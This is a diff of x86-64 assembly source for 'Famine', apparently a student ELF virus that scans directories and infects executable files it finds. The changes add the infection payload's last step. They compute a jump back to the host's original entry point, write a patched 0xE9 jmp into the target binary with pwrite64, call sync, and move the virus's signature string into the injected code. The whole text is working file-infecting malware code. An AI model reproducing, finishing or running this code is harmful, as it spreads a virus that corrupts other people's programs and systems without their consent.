@@ -9,7 +9,7 @@
 %define SYS_EXIT		60
 %define SYS_CHDIR		80
 %define SYS_GETDENTS64	217
-
+%define SYS_SYNC		162
 %define S_IFDIR 0x4000
 %define O_RDONLY 00
 %define S_IFMT 0xf000
@@ -22,7 +22,6 @@
 %define PHDR_SIZE 56
 %define PT_NOTE	4
 %define PT_LOAD 1
-
 %define PF_X 1
 %define PF_W 2
 %define PF_R 4
@@ -76,11 +75,11 @@
 ;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.
 
 ; r15 + 1484                                        phdr_num counter to iterate over the headers
-; r15 + 1492										current phdr offset
+; r15 + 1492										original phdr offset
 ; r15 + 1500                                        binary to infect size
 
 ; r15 + 1508                                        entry dpuente
-
+; r15 + 1516	(5 bytes)							jmp instruction
 global _start
 
 section .text
@@ -88,7 +87,6 @@ _start:
 	S_IRUSR equ 256 ; Owner has read permission
 	S_IWUSR equ 128 ; Owner has write permission
 
-	push rbp
 	push rdx
 	push rsp
 	sub  rsp, FAMINE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
@@ -290,8 +288,22 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 			mov rdx, [r15 + 1440]
 			add rdx, 5 							   ; JMP + 0xNNNNNNNN (5 bytes)
-			
-			
+			sub [r15 + 1508], rdx
+			sub dword [r15 + 1508], _stop - _start
+			mov byte [r15 + 1516], 0xe9
+			mov r9, [r15 + 1508]
+			mov [r15 + 1517], r9
+
+		_write_patched_jump:
+			mov rdi, [r15 + 1420]
+			lea rsi, [r15 + 1516]
+			mov rdx, 5
+			mov r10, rax
+			mov rax, SYS_PWRITE64
+			syscall
+
+			mov rax, SYS_SYNC
+			syscall
 
 			jmp _close_bin
 
@@ -315,16 +327,16 @@ _close_folder:
 	mov rax, SYS_CLOSE
 	syscall
 
+	signature:
+		call famine
+			db "Famine version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night's Watch"
+	famine:
+
 _end:
 	add rsp, FAMINE_STACK_SIZE
 	pop rsp
 	pop rdx
 
-	signature:
-		call famine
-			db "Famine version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night's Watch"
-	famine:
-		
 _stop:
 	mov rax, SYS_EXIT
 	xor rdi, rdi
